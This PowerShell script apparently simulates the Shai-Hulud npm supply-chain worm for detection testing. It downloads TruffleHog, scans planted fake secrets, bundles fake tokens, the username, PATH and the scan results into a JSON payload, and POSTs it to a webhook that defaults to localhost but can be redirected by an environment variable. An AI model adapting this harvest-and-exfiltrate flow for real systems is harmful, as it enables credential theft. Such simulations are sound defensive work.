#Requires -Version 5.1
<#
.SYNOPSIS
    Scenario 2: TruffleHog Secret Scanning Simulation
.DESCRIPTION
    Simulates downloading and running TruffleHog to scan for secrets, then exfiltrates results
#>

# Load environment variables if not already set
if (-not $env:FAKE_GITHUB_TOKEN) {
    $env:FAKE_GITHUB_TOKEN = "ghp_test_token_abcdef"
    $env:FAKE_NPM_TOKEN = "npm_test_token_12345"
    $env:FAKE_AWS_KEY = "AKIA_TEST_KEY_12345"
    $env:MOCK_WEBHOOK = if ($env:MOCK_WEBHOOK) { $env:MOCK_WEBHOOK } else { "http://localhost:8080/webhook-receiver" }
}

Write-Host "Scenario 2: TruffleHog Secret Scanning Simulation" -ForegroundColor Yellow

$TruffleHogBin = ""
$StubBin = "$env:TEMP\trufflehog_stub.exe"
$ReleaseTmp = "$env:TEMP\trufflehog_release.tar.gz"
$ExtractDir = "$env:TEMP\trufflehog_extracted"

# Check if TruffleHog is already installed
if (Get-Command trufflehog -ErrorAction SilentlyContinue) {
    $TruffleHogBin = (Get-Command trufflehog).Source
    Write-Host "Using installed TruffleHog: $TruffleHogBin" -ForegroundColor Green
} else {
    # Try to download TruffleHog from GitHub releases
    $OS = "windows"
    $Arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
    
    try {
        # Get latest version from GitHub API
        Write-Host "Fetching latest TruffleHog version from GitHub..." -ForegroundColor Cyan
        $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/trufflesecurity/trufflehog/releases/latest" -TimeoutSec 10 -ErrorAction Stop
        $version = $releaseInfo.tag_name
        $versionNum = $version -replace '^v', ''
        
        $downloadUrl = "https://github.com/trufflesecurity/trufflehog/releases/download/$version/trufflehog_${versionNum}_${OS}_${Arch}.tar.gz"
        
        Write-Host "Downloading TruffleHog $version from GitHub releases" -ForegroundColor Cyan
        Write-Host "URL: $downloadUrl" -ForegroundColor Gray
        
        # Download with progress
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $downloadUrl -OutFile $ReleaseTmp -TimeoutSec 60 -ErrorAction Stop
        $ProgressPreference = 'Continue'
        
        $fileSize = (Get-Item $ReleaseTmp).Length / 1MB
        Write-Host "Downloaded $([math]::Round($fileSize, 2)) MB" -ForegroundColor Green
        
        # Extract the archive
        if (Test-Path $ExtractDir) {
            Remove-Item $ExtractDir -Recurse -Force
        }
        New-Item -ItemType Directory -Path $ExtractDir -Force | Out-Null
        
        Write-Host "Extracting tar.gz archive..." -ForegroundColor Cyan
        # PowerShell can't natively extract .tar.gz, use tar if available
        if (Get-Command tar -ErrorAction SilentlyContinue) {
            tar -xzf $ReleaseTmp -C $ExtractDir 2>$null
        } else {
            # Fallback: try 7zip or fail gracefully
            Write-Host "tar command not found, trying alternative extraction..." -ForegroundColor Yellow
            throw "Cannot extract .tar.gz without tar command"
        }
        
        # Look for the executable
        $extractedBin = Join-Path $ExtractDir "trufflehog.exe"
        if (Test-Path $extractedBin) {
            $TruffleHogBin = $extractedBin
            Write-Host "TruffleHog extracted and ready: $TruffleHogBin" -ForegroundColor Green
            
            # Test if it runs
            try {
                $testVersion = & $TruffleHogBin --version 2>&1
                Write-Host "TruffleHog version: $testVersion" -ForegroundColor Green
            }
            catch {
                Write-Host "Warning: TruffleHog may not execute properly" -ForegroundColor Yellow
            }
        } else {
            Write-Host "Archive extracted but trufflehog.exe not found" -ForegroundColor Yellow
            $extractedFiles = Get-ChildItem $ExtractDir
            Write-Host "Files found: $($extractedFiles.Name -join ', ')" -ForegroundColor Gray
        }
    }
    catch {
        Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Yellow
        Write-Host "Using simulation instead (this is normal if offline or rate-limited)" -ForegroundColor Gray
    }
    
    # Create stub if real binary not available
    if (-not $TruffleHogBin) {
        Write-Host "Creating stub results for simulation" -ForegroundColor Gray
        # Don't create a stub binary, just skip to creating results file
        $TruffleHogBin = $null
    }
}

# Create fake secrets for scanning
$fakeSecretsDir = "$env:TEMP\fake-secrets"
if (Test-Path $fakeSecretsDir) {
    Remove-Item $fakeSecretsDir -Recurse -Force
}
New-Item -ItemType Directory -Path $fakeSecretsDir -Force | Out-Null

"fake_api_key=sk-test123456789" | Out-File -FilePath "$fakeSecretsDir\.env" -Encoding UTF8
"github_token=ghp_faketoken123" | Out-File -FilePath "$fakeSecretsDir\config.yaml" -Encoding UTF8

# Start background npm install
try {
    npm init -y 2>$null | Out-Null
}
catch {
    # Ignore errors
}

$installJob = Start-Job -ScriptBlock {
    try {
        npm install test-package 2>$null
    }
    catch {
        # Expected to fail
    }
}

Start-Sleep -Seconds 2

# Run TruffleHog scan
$resultsFile = "$env:TEMP\trufflehog_results.json"
if ($TruffleHogBin) {
    try {
        # Run real TruffleHog
        & $TruffleHogBin --results=verified --json filesystem $fakeSecretsDir | Out-File -FilePath $resultsFile -Encoding UTF8
        Write-Host "TruffleHog output captured at $resultsFile" -ForegroundColor Green
    }
    catch {
        Write-Host "TruffleHog execution failed; writing fallback results" -ForegroundColor Yellow
        '{"Detector":"fallback","Raw":"fake_secret","Source":"windows_simulation"}' | Out-File -FilePath $resultsFile -Encoding UTF8
    }
} else {
    Write-Host "TruffleHog unavailable; writing simulation results" -ForegroundColor Yellow
    '{"Detector":"simulation","Raw":"fake_secret_sk-test123456789","Source":"' + $fakeSecretsDir + '","Note":"Real TruffleHog download failed - using simulated results"}' | Out-File -FilePath $resultsFile -Encoding UTF8
}

# Encode results
$resultsContent = Get-Content $resultsFile -Raw
if ([string]::IsNullOrEmpty($resultsContent)) {
    $resultsContent = '{"Detector":"empty","Raw":"no_results"}'
}
$resultsB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($resultsContent))

# Get values that need error handling beforehand
$nodeVer = try { & node -v } catch { "unknown" }
$truffleVer = if ($TruffleHogBin) { try { & $TruffleHogBin --version 2>$null } catch { "simulation" } } else { "simulation" }

# Create structured payload
$payloadFile = "$env:TEMP\shai-hulud-secrets.json"
$payload = @{
    application = @{
        name = "test-evil-package"
        version = "1.0.0"
        description = "Simulated Shai-Hulud payload"
    }
    system = @{
        platform = [System.Environment]::OSVersion.Platform.ToString()
        architecture = [System.Environment]::GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")
        platformDetailed = [System.Environment]::OSVersion.ToString()
        architectureDetailed = [System.Environment]::Is64BitOperatingSystem
    }
    runtime = @{
        nodeVersion = $nodeVer
        platform = "Windows"
        architecture = [System.Environment]::GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")
        timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
    }
    environment = @{
        USER = $env:USERNAME
        PATH = $env:PATH
    }
    modules = @{
        github = @{
            authenticated = $false
            token = $env:FAKE_GITHUB_TOKEN
            username = "simulated-user"
        }
        aws = @{
            secrets = @($env:FAKE_AWS_KEY)
        }
        gcp = @{
            secrets = @()
        }
        truffleHog = @{
            available = [bool]$TruffleHogBin
            installed = [bool](Get-Command trufflehog -ErrorAction SilentlyContinue)
            version = $truffleVer
            platform = "Windows"
            results = $resultsB64
        }
        npm = @{
            token = $env:FAKE_NPM_TOKEN
            authenticated = $true
            username = "simulated-maintainer"
        }
    }
} | ConvertTo-Json -Depth 10

$payload | Out-File -FilePath $payloadFile -Encoding UTF8

# Post results to webhook
$targetUrl = if ($env:SHAI_HULUD_GIST_URL) { $env:SHAI_HULUD_GIST_URL } else { $env:MOCK_WEBHOOK }
Write-Host "Posting simulated secrets to $targetUrl" -ForegroundColor Cyan

try {
    $headers = @{ "Content-Type" = "application/json" }
    if ($env:SHAI_HULUD_GIST_TOKEN) {
        $headers["Authorization"] = "token $env:SHAI_HULUD_GIST_TOKEN"
    }
    
    $response = Invoke-RestMethod -Uri $targetUrl -Method POST -Headers $headers -Body $payload -TimeoutSec 30
    Write-Host "Payload posted successfully" -ForegroundColor Green
}
catch {
    Write-Host "Failed to post payload: $($_.Exception.Message)" -ForegroundColor Yellow
}

# Clean up background job
$installJob | Stop-Job -PassThru | Remove-Job -Force

Write-Host "Scenario 2 complete" -ForegroundColor Green
